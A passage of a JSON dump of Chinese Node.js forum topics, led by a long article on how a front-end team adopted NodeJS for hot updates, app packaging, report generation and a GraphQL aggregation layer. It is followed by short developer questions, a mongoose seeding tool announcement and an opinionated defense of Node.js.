2019国外付费vpn推荐","last_reply_at":"2019-04-29T10:34:15.136Z","good":false,"top":false,"reply_count":23,"visit_count":23346,"create_at":"2018-05-31T15:55:49.256Z","author":{"loginname":"wallmama","avatar_url":"https://avatars3.githubusercontent.com/u/39631585?v=4&s=120"}},{"id":"5cc2a72f37faec0ce1d06fc4","author_id":"5062b5ea01d0b801483ae4ff","tab":"share","content":"<div class=\"markdown-text\"><p>Scott 近两年无论是面试还是线下线上的技术分享，遇到许许多多前端同学，由于团队原因，个人原因，职业成长，技术方向，甚至家庭等等原因，在理想国与现实之间，在放弃与坚守之间，摇摆不停，心酸硬扛，大家可以找我聊聊南聊聊北，对工程师的宿命有更多的了解，有更多的看见与听见，Scott 微信： codingdream。\n<a href=\"https://juejin.im/user/5790c76dc4c9710054f0f58b/posts\">本系列共 18+ 篇</a>（最开始 15+ 篇，未来会扩充到 30 篇），此为第二篇预热，大家感兴趣后面文章可以点下关注，再转发下朋友圈我就心满意足了。</p>\n<h2>正文开始</h2>\n<blockquote>\n<p>任何可以用 JavaScript 来写的应用，最终都将用 JavaScript 来写。  – <a href=\"https://baike.baidu.com/item/%E9%98%BF%E7%89%B9%E4%BC%8D%E5%BE%B7%E5%AE%9A%E5%BE%8B/631745?fr=aladdin\">阿特伍德定律</a></p>\n</blockquote>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1554174966442-f4c825d1-cbf0-40f0-b2fa-72633d0356f8.png#align=left&amp;display=inline&amp;height=602&amp;name=image.png&amp;originHeight=1204&amp;originWidth=2154&amp;size=417530&amp;status=done&amp;width=1077\" alt=\"image.png\">&lt;br /&gt;</p>\n<p>这篇文章向大家介绍下小菜前端的基建在一步步走过来的过程中，NodeJS 是如何使用的及扮演了哪些角色，它对于工程师个人，团队能力，公司研发效率，业务支撑，技术的探索与突破等等到底有什么实际的意义，以及为什么是它而不是 Python/C++/PHP/Java 成为了前端团队的核心技术栈。</p>\n<h2>被 NodeJS 加速的框架演进速度</h2>\n<p>2019 年的前端与 2009 年的前端早已是君住长江头我住长江尾，短短十年，人是物非，React/Vue 一统天下，Webpack 标配江湖，单纯看近 2 年的 【Npm Trends】:</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1550981329667-dc6c72b5-189b-4af4-ba7d-71da018f88ce.png#align=left&amp;display=inline&amp;height=456&amp;name=image.png&amp;originHeight=570&amp;originWidth=1086&amp;size=115661&amp;status=done&amp;width=869#align=left&amp;display=inline&amp;height=392&amp;originHeight=570&amp;originWidth=1086&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>或者参考近 10 年的【<a href=\"https://trends.google.com/trends/explore?date=2012-02-24%202019-02-24&amp;q=%2Fg%2F11clg_kyfc,Backbone.js,AngularJS,ReactJS,VueJS\">Google Trends</a>】：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1550980367882-4065a804-bbfd-4e59-b028-af6d2353de4f.png#align=left&amp;display=inline&amp;height=370&amp;name=image.png&amp;originHeight=462&amp;originWidth=1152&amp;size=58234&amp;status=done&amp;width=922#align=left&amp;display=inline&amp;height=299&amp;originHeight=462&amp;originWidth=1152&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>热度一定程度反映了社区活跃，和占用市场的体量，可以发现 AngularJS 也是经历了过山车，市场被 React/Vue 不断侵蚀，那再把 jQuery 加进来看下：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1550978165549-170815d8-87f6-4b65-9bbb-95d6964e2d8a.png#align=left&amp;display=inline&amp;height=375&amp;name=image.png&amp;originHeight=468&amp;originWidth=1152&amp;size=55446&amp;status=done&amp;width=922#align=left&amp;display=inline&amp;height=303&amp;originHeight=468&amp;originWidth=1152&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>令人瞠目结舌，即便 React/Vue（绿色和紫色） 如日中天的今天，在整个网络的搜索热度上，也远远低于 jQuery 和 NodeJS，尤其是 jQuery，虽然它的热度在持续降低，但依然是整个互联网中不能忽视的重要组成部分，</p>\n<p>虽然早期与 jQuery 同时代还有很多其他框架类库，比如 ExtJS/Mooltools/Dojo/Yui/Kissy 等等等等，但它们的体量比起 jQuery 都差之甚远不再比较，如果大家把近十年听到的看到的框架罗列起来，几十上百都不成问题，生命周期能超过 5 年却寥寥无几，尤其是在 2012 年 NodeJS 在全球推广到一定规模后，框架的诞生迭代替换更为快速，所以从框架的生命力来看，jQuery 目前为止依然是赢家，那它跟 NodeJS 有什么关系呢？</p>\n<p>NodeJS 的持续变热，jQuery 也在持续走冷，一部分原因就是 NodeJS 生态基建能力，在之上不断的生长出来新的框架与解决方案（不限于 AngularJS/React/Vue），也在不断的蚕食 jQuery 的市场，倘若没有 NodeJS，自然也不可能有新框架的繁荣之态，今天大有可能依然是 jQuery 在一统江湖。</p>\n<p>在今天，无论是 Angular/React/Vue/Webpack，从开发体验、单元测试到打包编译，脱离了 NodeJS 生态，都无法正常运转，NodeJS 就是整个上层建筑的物理基础和配套设施。</p>\n<p>现在我们已经从宏观上了解了 NodeJS 对于前端框架进化和保障的重要性，接下来，就结合小菜前端在 NodeJS 上的建设与大家聊聊它的重要性，2 年来，我们重度使用 NodeJS 陆续参与了十几个重要的工具/产品/系统的建设，下面挑选四个有代表性的分享给大家：</p>\n<h2>小菜前端第一次尝鲜 NodeJS - APP 热更新服务</h2>\n<p>写一些 NodeJS 自动化脚本，代码校验甚至利用 Express/Koa 搭建一些简单的服务，这些都不能算做真正意义使用 NodeJS，我们也抛开 ReactNative/Webpack 等前端开发打包编译需要依赖 NodeJS 这样的场景，我们第一次真正意义使用 NodeJS， 就是对 ReactNative APP 开发的热更新系统，代号神奇博士，服务端框架用的 ThinkJS 框架，那时候是 2016 年中，Scott 还没有入职小菜。</p>\n<p>这样一个热更新发布系统可以让客户端 APP 动态更新到增量的代码包，最原始的更新流程如下图：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1550986692321-51ff661f-6031-4c4b-8e7a-93b0df3a3fe5.png#align=left&amp;display=inline&amp;height=778&amp;name=image.png&amp;originHeight=972&amp;originWidth=1832&amp;size=178950&amp;status=done&amp;width=1466#align=left&amp;display=inline&amp;height=396&amp;originHeight=972&amp;originWidth=1832&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>在热更新系统中，需要针对 iOS/Android 的 IPA/APK 包进行特定操作系统的资源拆包，增量包/原生包存储，包版本管理，权限管理等功能，这些事情是不太可能让服务端童鞋比如 Java 童鞋替你做的，只能前端自己做，也只能用 NodeJS 才能快速的开发出来。</p>\n<p>系统上线后，整个公司的 App 发版频率从一个月一两次（审核还会被打回）提升到一周三四次，效率至少提升 10 倍，而且用户的更新体验得到质的提升，对于业务/运营/产品/用户都有极大的价值。</p>\n<p>这时候我们概念里面的 NodeJS 可能更像是一个特定场景的功能玩具，并没有深挖它的重要性和可能性，虽然尝到了甜头，但往后的一年多没有再持续挖掘。</p>\n<h2>小菜前端第二次尝鲜 NodeJS - APP 打包平台</h2>\n<p>Scott 是从 2011 年开始接触和使用 NodeJS，从 2013 年后技术栈以 NodeJS 为主，开始尝试搭建比较复杂的系统，非常清楚它的优势和短板，在 2017 年下半年开始带前端团队的时候，收到了很多的反馈和投诉，主要分为两类： APP 更新失败的问题（在非常高的迭代节奏下） 和前后端协作的接口/联调问题，针对 APP 更新下失败的问题，我们先来还原下当时的开发状态，大家如果也有多人协作 RN APP 的开发，可以参考接下来我们的做法，相信对你有用。</p>\n<p>我们的 APP 当时一共有 5 个 - 宋小菜（对外）、宋小菜司机（对外）、宋小菜供应商（对外），宋小福（对内）、采秘（对内），所有的 APP 都是 RN 开发，都有 iOS/Android 两个版本，其中对外的是商业开发版本，要发布到苹果商店和推送到特定渠道，对内的都是企业包，不对外公开，我们通过公司自己的网站托管应用供员工安装。</p>\n<p>这些 APP 之间的业务也有一定的联系，通常开发宋小菜，也会联动要修改宋小福或者采秘，在本地开发的时候，需要在每个包里面，区分连接的是日常测试环境，还是线上生产环境，还要区分是可以打印出日志的 debug 包，还是非 debug 包，并且最终上线前，再由每个同学在本地 Mac 上打出一个包上传到热更新平台，这个流程里面会出现大量问题，我曾经画了这样一张图给服务端的同学解释为什么前端打包 APP 到上线会经常出问题：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1550999857898-de8b5645-d5c0-494b-ac53-50fd3c3232dc.png#align=left&amp;display=inline&amp;height=462&amp;name=image.png&amp;originHeight=577&amp;originWidth=805&amp;size=167561&amp;status=done&amp;width=644#align=left&amp;display=inline&amp;height=535&amp;originHeight=577&amp;originWidth=805&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>这样就会有很多组合，有的包是要频繁打的，有的偶尔来几发，打包的时候要区分：</p>\n<ul>\n<li>是哪一个 APP</li>\n<li>是打 iOS 还是 Android 的包</li>\n<li>是正式环境，还是日常测试环境</li>\n<li>打的包要不要开启热更新功能，不开启就不会走线上热更新流程</li>\n<li>这个包要不要实时连到本地打一些 log 出来，也就是是否需要 Debug</li>\n<li>是在哪个同学电脑上打的包</li>\n</ul>\n<p>这样硬组合就可以打出 64 个不同的包，意味着可能需要把配置文件修改 64 次，另外，每个同学电脑上的 Mac 操作系统版本会有不同，XCode/Gradle 也可能版本不同，更不用说 Node 以及 NPM 所安装的三方包，甚至本地预装的开发者证书也时有不一致的情况，于是整个团队陷在了打包/包正确性/一致性/是否能打出来一堆问题形成的泥坑里，艰难的对外解释，艰难的互相配合，针对这个问题，我们思路是让这一切可以傻瓜一点自动化一点，让团队共用一个打包环境，以它打的包为准，于是我们启动了大伯伯打包平台，采购了一台高配 Mac Mini 部署在内网，把所有的配置项都通过界面来管理，简要流程如下：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551006257020-d1107ba9-0642-49cc-ab2b-5331ce817779.png#align=left&amp;display=inline&amp;height=579&amp;name=image.png&amp;originHeight=724&amp;originWidth=1088&amp;size=227220&amp;status=done&amp;width=870#align=left&amp;display=inline&amp;height=496&amp;originHeight=724&amp;originWidth=1088&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>界面一开始很朴素，长这个样子：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551007043243-1c800232-5a2e-42f4-9ecc-07dacc14c7f8.png#align=left&amp;display=inline&amp;height=864&amp;name=image.png&amp;originHeight=1080&amp;originWidth=1234&amp;size=268898&amp;status=done&amp;width=987#align=left&amp;display=inline&amp;height=653&amp;originHeight=1080&amp;originWidth=1234&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>这个系统上线 1 年来，我们已经打了 1000 多个包，因为打包而出现环境错误问题 0 次，极大的解放了团队效率和提升了打包的正确性，更重要的是对于团队也沉淀了一些基于 Node 使用的技能，坚定了大家使用它的信心：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551006379204-19cd28b9-5ec2-4a5d-ba23-ee5a34330b8e.png#align=left&amp;display=inline&amp;height=579&amp;name=image.png&amp;originHeight=723&amp;originWidth=1086&amp;size=239018&amp;status=done&amp;width=869#align=left&amp;display=inline&amp;height=497&amp;originHeight=723&amp;originWidth=1086&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<h2>小菜前端第三次尝鲜 NodeJS - 报表快速制作平台</h2>\n<p>无论是 toB 还是 toC 公司，把数据库里的数据拎出来，无论直接导出为 Excel，还是通过接口输出到前端页面中展示，都是硬刚需，小菜也不例外，而且小菜的业务早些年变化特别高频，每次变化都要提一堆报表需求来监控调整前后的业务变化是否符合预期，如果没有了报表就跟算命一样全靠猜，然后这样一个普通不能再普通的需求，却让小菜整个产品技术团队头疼了好几年。</p>\n<p>在紧张的业务开发项目中，让前后端各自抽出资源来对接一个个的报表字段，再通过接口 - 页面的联调和发布，是一件非常浪费资源的事情，后端感觉自己像是一个写 SQL 的和接口胶水代码的，前端感觉自己就是个纯粹 Table 报表页面仔，而且经常资源交叉冲突导致报表优先级降低甚至拖很久不能给到业务方，所以公司做了整整 3 年，总共才产出了 50 多个报表零散的扔在 ERP 系统里面，针对这个问题，前端启动了一个项目 - 大表哥报表平台，用来解决报表产出效率的问题，实现 SQL 到页面的自动生成，后端工程师，甚至会 SQL 的产品经理和运营都可以到平台上，按照约定的规则粘贴一些 SQL，或者基于编辑页面组装一些 SQL 的子语句，咔咔！报表生成，这个系统上线 1 年来，生产力一下子得到释放，总共产出了 400 多张报表：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551008061890-718ddcbe-9e88-4901-9c49-68b2c64df4cb.png#align=left&amp;display=inline&amp;height=342&amp;name=image.png&amp;originHeight=427&amp;originWidth=1287&amp;size=76549&amp;status=done&amp;width=1030#align=left&amp;display=inline&amp;height=248&amp;originHeight=427&amp;originWidth=1287&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>公司的员工浏览报表每天都有一两千次，直接导出 Excel 就导出了 1 万 6 千多次，已经是公司内部最成功的一个工具产品，服务于全公司所有部门，报表展示大概长这样：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551008972313-977d0787-738d-436a-b7f8-aeb604a271b4.png#align=left&amp;display=inline&amp;height=48&amp;name=image.png&amp;originHeight=60&amp;originWidth=1799&amp;size=11981&amp;status=done&amp;width=1439#align=left&amp;display=inline&amp;height=25&amp;originHeight=60&amp;originWidth=1799&amp;status=done&amp;width=746\" alt=\"image.png\">&lt;br /&gt;<img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551009457628-a3392dd4-d83b-4b2d-9375-500b29d028c1.png#align=left&amp;display=inline&amp;height=277&amp;name=image.png&amp;originHeight=346&amp;originWidth=1792&amp;size=90248&amp;status=done&amp;width=1434#align=left&amp;display=inline&amp;height=144&amp;originHeight=346&amp;originWidth=1792&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>一个报表的制作界面大概长这样：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551008550743-059db323-1dbf-458e-9156-bf2a0acd0ad2.png#align=left&amp;display=inline&amp;height=404&amp;name=image.png&amp;originHeight=505&amp;originWidth=1222&amp;size=87311&amp;status=done&amp;width=978#align=left&amp;display=inline&amp;height=308&amp;originHeight=505&amp;originWidth=1222&amp;status=done&amp;width=746\" alt=\"image.png\">&lt;br /&gt;<img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551008636940-7c9e14e5-5f67-43cf-bcc5-887fc4800f91.png#align=left&amp;display=inline&amp;height=613&amp;name=image.png&amp;originHeight=766&amp;originWidth=1221&amp;size=73231&amp;status=done&amp;width=977#align=left&amp;display=inline&amp;height=468&amp;originHeight=766&amp;originWidth=1221&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>通过对 SQL 的各种查询词的组件封装，可以从界面快速生成一个可在数据库执行的复杂 SQL 语句，或者反向贴入符合规则的 SQL，自动拆解成报表的表头（字段的中文名称），自动映射到组件（日期、排序、筛选、二级跳转的子报表等等），包括整个报表的需求提出、描述、认领、上下线、制作和发布这样的工作流等等也全部用 NodeJS 实现，这次尝鲜不仅奠定了 NodeJS 在前端团队绝对的位置，也实质性的在支撑业务这里拿到了很好的结果，更让我们感到欣喜的是，在报表系统里面使用 GraphQL 是多么的便捷，同时前端部门独立支撑数据相关的业务产品这条路变得可行，NodeJS 的角色从工具也延展到了业务。</p>\n<h2>小菜前端第四次尝鲜 NodeJS - 前后端数据聚合服务</h2>\n<p>如果说前面几个，都是与服务端团队解耦的，是前端可以独立完成的，那么这一次，则是跟服务端在职能上和系统上都有强耦合的地方，是跨团队研发层面的尝试，这次发生在 2018 年 2 月份，也就是在前两次尝鲜后，我们又一次比较大胆的突破。</p>\n<p>背景依然是前端的页面与后端的接口这里，关于这个后面会专门有一篇详细与大家聊聊前后端合作研发上我们的思考，这里我简述一下，前后端的合作方式通常是数据接口，也就是数据格式和字段约定，一个吐数据一个消费数据，吐什么样的数据取决于消费什么样的数据，消费的数据则来源于产品流程上的 UI 展示形式，一份概念里统一的数据，是有可能被分拆成两个 UI 块展示和复用，可能会让接口颗粒度更小拆成 2 个，或者共用一个大的，频次高一些的 UI 改版也会导致接口的通用性变得很弱，最终产生一堆大而全的重体积接口，进而对前端维护页面和用户的加载产生较大的影响。</p>\n<p>而且接口里面永远是黑盒，在前端是看不全接口的能力了，一旦文档没有跟上，接口的输出与 UI 的使用便会脱节，为产品运行的带来了更强的不稳定性，所以我们会希望接口都是纯粹的，用到多少字段就输出多少字段，用到什么格式就输出什么格式，同一个页面的数据，尽量一个接口返回而不是三四个接口返回，但这显然对服务端提出了更高的要求，也是很多公司从前端产品层面试图推动后端团队时候无功而返的最大阻力。一个人群中，大部分人都倾向于不作出改变，在没有看到太多对自己带来的好处之前，而短期成本与长期红利之间大部分会选择短期，因为它容易预见。</p>\n<p>我们的解决办法是，用 NodeJS(EggJS) + GraphQL 搭建一个系统，它负责三件事：</p>\n<ul>\n<li>负责对前端输出所需数据（单接口，要什么给什么，无冗余可组合）</li>\n<li>负责去拿所有的服务端微服务接口数据（HTTP 协议或者 RPC 协议）</li>\n<li>提供一个可以在线连接接口、约束字段以及实时 Mock 的编辑系统</li>\n</ul>\n<p>对它的要求是可在线编辑，可联调测试，可数据热发布与热回滚，这个系统上线后，我们接管了 2 款 App 的接口需求，前端拼装页面和组合数据时候变得更灵活自如，同时正向逆向的数据监控，让我们对数据更有把控力，对于服务端来说，也可以更加不关注 UI 如何，更关注业务领域的搭建与标准数据接口的封装，它的界面长这个样子：</p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551011468885-fe470426-e822-438e-9938-10df31779e95.png#align=left&amp;display=inline&amp;height=573&amp;name=image.png&amp;originHeight=716&amp;originWidth=1971&amp;size=111706&amp;status=done&amp;width=1577#align=left&amp;display=inline&amp;height=271&amp;originHeight=716&amp;originWidth=1971&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551011516619-07f39971-29fd-4148-b00d-0c72e652e82d.png#align=left&amp;display=inline&amp;height=354&amp;name=image.png&amp;originHeight=442&amp;originWidth=1953&amp;size=81644&amp;status=done&amp;width=1562#align=left&amp;display=inline&amp;height=169&amp;originHeight=442&amp;originWidth=1953&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551011398749-0bfa9fba-b34a-4932-b42e-1cce7a892f92.png#align=left&amp;display=inline&amp;height=519&amp;name=image.png&amp;originHeight=649&amp;originWidth=1892&amp;size=139818&amp;status=done&amp;width=1514#align=left&amp;display=inline&amp;height=256&amp;originHeight=649&amp;originWidth=1892&amp;status=done&amp;width=746\" alt=\"image.png\">&lt;br /&gt;<img src=\"https://cdn.nlark.com/yuque/86/2019/png/87556/1551011560236-bd5765c7-d1bb-4c34-9fde-a3f48c825ab0.png#align=left&amp;display=inline&amp;height=446&amp;name=image.png&amp;originHeight=557&amp;originWidth=2084&amp;size=168554&amp;status=done&amp;width=1667#align=left&amp;display=inline&amp;height=199&amp;originHeight=557&amp;originWidth=2084&amp;status=done&amp;width=746\" alt=\"image.png\"></p>\n<p>还有接口地图、数据关系网络、接口字段监控、Mock 系统等等不再一一截图，这个 NodeJS 搭建的系统的复杂度还是蛮高的，上线后我们专门组织了一场技术分享 - <a href=\"https://juejin.im/post/5b29cd2be51d4558d217c644\">杭州第一届 GraphQLParty</a>，让它开源的群众呼声很高，我们觉得还需要更多 NodeJS 的专家进来把系统进一步完善后，才真正能达到开源的标准，目前依然是在公司内部使用。</p>\n<p>综上，小菜前端基于 NodeJS 既有 Eat My Own Shit 的内部场景的问题解决，也有直接服务于前端产品的工具，也有直接把数据当做业务来支撑公司决策的业务产品，还有专注在前后端研发效率的数据聚合层的全方位尝试，从内到外从前到后，而这些系统的尝试，又为前端团队沉淀了非常多的服务端能力，系统设计能力，甚至带来跨语言栈的变化，童鞋们的技术能力也都大幅提升，所以 NodeJS 越来越成为前端团队的核心技术栈，一切基于它的深度尝试，只要能贴合你团队的痛点，公司业务的痛点，那么都是值得尝试的。</p>\n<p>最最后，本文作为预热篇，旨在针对如下话题为大家输出：</p>\n<ul>\n<li>把团队蛮荒到自动化运维的从 0 到 1</li>\n<li>成长历程总结输出给社区，帮助更多的小团队少走弯路</li>\n<li>以一种可被量化的方式汇聚小菜前端的困惑、沉淀与方法路径，给团队带来更多创作成就感</li>\n<li>从更多视角侧切进入团队管理/技术演进/个人成长的过程中，探讨工程师团队的价值最大化</li>\n</ul>\n<p>如果大家感兴趣，我们小菜前端团队，会集体智慧共同凝聚，一起撰写并推出一本偏前端职业生涯、技术成长和团队成长的小册，回馈给大家，大家在文后记得留言评论和提需求哦，还有别忘了加 Scott 微信哈： codingdream。</p>\n<p>作者：Scott\n链接：<a href=\"https://juejin.im/post/5cc04ecef265da03973ab107\">https://juejin.im/post/5cc04ecef265da03973ab107</a>\n来源：掘金\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>\n</div>","title":"技术栈：为什么 Node 是前端团队的核心技术栈","last_reply_at":"2019-04-29T07:55:21.256Z","good":false,"top":false,"reply_count":8,"visit_count":2181,"create_at":"2019-04-26T06:37:35.385Z","author":{"loginname":"huanglong","avatar_url":"https://avatars1.githubusercontent.com/u/670360?v=4&s=120"}},{"id":"5cc3ae1fa86ae80ce64b4904","author_id":"528a32b1d2b3893f2a6aceeb","tab":"ask","content":"<div class=\"markdown-text\"><p>RT</p>\n</div>","title":"Node 10.0 之后 express 也可以 async/await 了，那么koa2还有存在的意义吗","last_reply_at":"2019-04-29T06:00:54.164Z","good":false,"top":false,"reply_count":7,"visit_count":1179,"create_at":"2019-04-27T01:19:27.789Z","author":{"loginname":"Hanggi","avatar_url":"https://avatars2.githubusercontent.com/u/5997900?v=4&s=120"}},{"id":"5cc5c70a37faec0ce1d07c39","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fupbpm2nJQFXTMVU9FK8dYVMPOFe\" alt=\"1.png\"><img src=\"//static.cnodejs.org/FmS8pA3EKJkqQjNZUnEb1iuxUL-G\" alt=\"2.png\"><img src=\"//static.cnodejs.org/Ft-SQYR6m5C61cq3ZkI5fLhBjBYr\" alt=\"WechatIMG116.png\"><img src=\"//static.cnodejs.org/FvYCjEfX667emIyE-hbclYFUVZlq\" alt=\"WechatIMG117.png\"></p>\n<h3>平时都好好的。未知下午出现这个情况。很头疼！严重影响开发。哪位大佬是否遇到过</h3>\n</div>","title":"vue.cli3.0代理后接口没有返回，浏览器内存攀升，页面卡死。请问这是什么情况，哪位大佬知道。","last_reply_at":"2019-04-29T04:33:33.808Z","good":false,"top":false,"reply_count":3,"visit_count":569,"create_at":"2019-04-28T15:30:18.914Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5cc3ceb3a86ae80ce64b49bd","author_id":"5520a425ce156cc206687c5c","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/zhangkaiyulw/seedgoose\">Seedgoose</a> 支持自动id。</p>\n<p>不管用什么seed工具，seed数据的时候，关联是最让人头疼的。</p>\n<p>Seedgoose让关联没有烦恼。</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;_id&quot;: &quot;jack&quot;,\n  &quot;age&quot;: 20,\n  &quot;school&quot;: &quot;no1 middle school&quot;\n}\n</code></pre><pre class=\"prettyprint language-json\"><code>{\n  &quot;_id&quot;: &quot;no1 middle school&quot;,\n  &quot;name&quot;: &quot;No. 1 Middle School&quot;\n}\n</code></pre><pre class=\"prettyprint language-bash\"><code>seedgoose seed\n</code></pre><p>功能如你所想。</p>\n</div>","title":"mongoose最好用的seeder","last_reply_at":"2019-04-29T04:29:25.472Z","good":false,"top":false,"reply_count":4,"visit_count":582,"create_at":"2019-04-27T03:38:27.808Z","author":{"loginname":"cheunghy","avatar_url":"https://avatars0.githubusercontent.com/u/3055936?v=4&s=120"}},{"id":"5cc182f937faec0ce1d06a78","author_id":"5a9ded34be0ec087668bcd0d","tab":"ask","content":"<div class=\"markdown-text\"><p>有的语言可以 <code>from 'package' import sth</code></p>\n<p>js则是 <code>import { sth} from 'package'</code> ,要有提示只能先把 package 码了,再移光标回前面.</p>\n<p>我用的 vscode,大家伙有啥办法解决这个蛋疼的问题吗?</p>\n</div>","title":"import from语法顺序很蛋疼,有什么办法解决吗?","last_reply_at":"2019-04-29T03:53:34.303Z","good":false,"top":false,"reply_count":19,"visit_count":1327,"create_at":"2019-04-25T09:50:49.176Z","author":{"loginname":"abiuDoIT","avatar_url":"https://avatars2.githubusercontent.com/u/30167501?v=4&s=120"}},{"id":"5a328967d92f2f5b185ace96","author_id":"54009f5ccd66f2eb37190485","tab":"share","content":"<div class=\"markdown-text\"><p>本来不想回复的，匿名的那哥们写的挺好的，虽然不懂他为什么要匿名。但看到某些回复，不得不说几句。乱解读，误人子弟的事，还是有必要澄清的，以免Node有无端被黑，相信这也是所有布道者都应该承担这种除魔卫道的责任。</p>\n<blockquote>\n<p>没有领袖，Node 之父用 Go，TJ 也用 Go，都跑了。</p>\n</blockquote>\n<ol>\n<li>语言不是因素，是他想做的事儿变了，但他的心依然还是爱着Koa</li>\n</ol>\n<p>TJ转做Go有很多原因</p>\n<ul>\n<li>人家做的基于aws Lambda的基础设施 <a href=\"https://github.com/apex/apex%EF%BC%8C%E9%80%89%E6%8B%A9Go%E6%97%A0%E5%8F%AF%E5%8E%9A%E9%9D%9E%EF%BC%8C%E4%BB%8E%E6%9E%B6%E6%9E%84%E8%A7%92%E5%BA%A6%EF%BC%8C%E6%88%91%E8%BF%98%E8%A6%81%E7%BB%99%E4%BB%96%E7%82%B9%E8%B5%9E%EF%BC%81\">https://github.com/apex/apex，选择Go无可厚非，从架构角度，我还要给他点赞！</a></li>\n<li>TJ对Node.js一直很关注，尤其对Koa框架，看他的Pinned repositories 就知道，另外给Koa提issue被他怼过，也可见他很在意Koa</li>\n</ul>\n<p>别乱解读，误人子弟</p>\n<ol>\n<li>Node.js之父在2012年就离开社区的，然而这5年发展的依然很好</li>\n</ol>\n<p>狼叔写过一篇文章 <a href=\"https://cnodejs.org/topic/59daf46f2543cb3368b1627e\">请别拿“死”人做文章</a>，\nNode.js之父Ryan Dahl在2012年就离开社区的，我们必须要承认他作为创始人的伟大创举，但不能标签化，ryan不代表node，从他离开社区后，对于社区而言，他就“死”在曾经的丰功伟绩上，未来与他无关！</p>\n<p>Node.js之父在2012年就离开社区的，然而这5年发展的依然很好，并无影响。这篇文章本来没什么问题，但有些人借位营销就恶心了。</p>\n<p>狼叔说：Node.js不是最好，也不是最差，是性价比比较高的，可惜node做后端一直不温不火，java，php利益相关，只有新项目用，微服务架构下，会更好一些。很多人node是用错的，不是用node就什么都用，分清场景。不误解，不传谣，合适自己的才是最好的\n但是总有些人想拿这事儿做文章过度解读，</p>\n<blockquote>\n<p>抽象程度不够高，对于做业务的人来说这很痛苦。使用者中小白太多，人员素质参差不齐，包的数量多，质量却呵呵。</p>\n</blockquote>\n<p>这完全是没逻辑的屁话，看起来没问题，却经不起推敲。</p>\n<p>抽象程度，所有语言都有这个问题，Go就没有么？Java、PHP这么多年小白少么？说人员素质参差不齐，哪个语言不一样？所以说，这完全是狗屁逻辑。我比较喜欢Ruby社区，是高手和低手两级分化最明显。Node.js从2009年到现在才8年，再成熟能成熟到哪里呢？不拿一个起点比较都是扯淡。</p>\n<p>最后说npm，黑的完全不到点上，目前超过60万个模块，绝对是社区第一。在众多包管理器上，我没见过质量都一样好的，按照8020原则，60万里至少有12万个模块是不错的吧，你工作中能用到的会超过三位数么？</p>\n<p>所以说质量好不好要看人怎么选，而不应该赖到npm上。长点心吧。</p>\n<blockquote>\n<p>用来做脚本倒是没啥问题，做商业开发就处处踩坑了。我没怎么用 Node做 Web，因为怕 hold 不住。</p>\n</blockquote>\n<p>没用过，就别瞎逼逼。</p>\n<p>国内国外的成功案例，眼瞎看不到么？我亲历的去哪儿和阿里都在大量使用，我亲耳听到的腾讯大量使用Node，对于李成银所在的360团队也是大量使用。</p>\n<p>如果说 Node hold 不住，其他语言就能 hold 住？呵呵</p>\n<p>如果说 人 hold 不住，那我相信，那是水平问题。</p>\n<blockquote>\n<p>目前 Node Web 框架依然是 koa 和 express 类似的架构，中间件没什么问题，但是如何组织它们，如何在 high level 层面把控他们却没有看到很好的最佳实践。</p>\n</blockquote>\n<p>没用Node还哔哔框架，不是打脸么？</p>\n<p>我们可以根据框架的特性进行分类</p>\n<table>\n<thead>\n<tr>\n<th>框架名称</th>\n<th>特性</th>\n<th>点评</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Express</td>\n<td>简单、实用，路由中间件等五脏俱全</td>\n<td>最著名的Web框架</td>\n</tr>\n<tr>\n<td>Derby.js &amp;&amp; Meteor</td>\n<td>同构</td>\n<td>前后端都放到一起，模糊了开发便捷，看上去更简单，实际上上对开发来说要求更高</td>\n</tr>\n<tr>\n<td>Sails、Total</td>\n<td>面向其他语言，Ruby、PHP等</td>\n<td>借鉴业界优秀实现，也是 Node.js 成熟的一个标志</td>\n</tr>\n<tr>\n<td>MEAN.js</td>\n<td>面向架构</td>\n<td>类似于脚手架，又期望同构，结果只是蹭了热点</td>\n</tr>\n<tr>\n<td>Hapi和Restfy</td>\n<td>面向Api &amp;&amp; 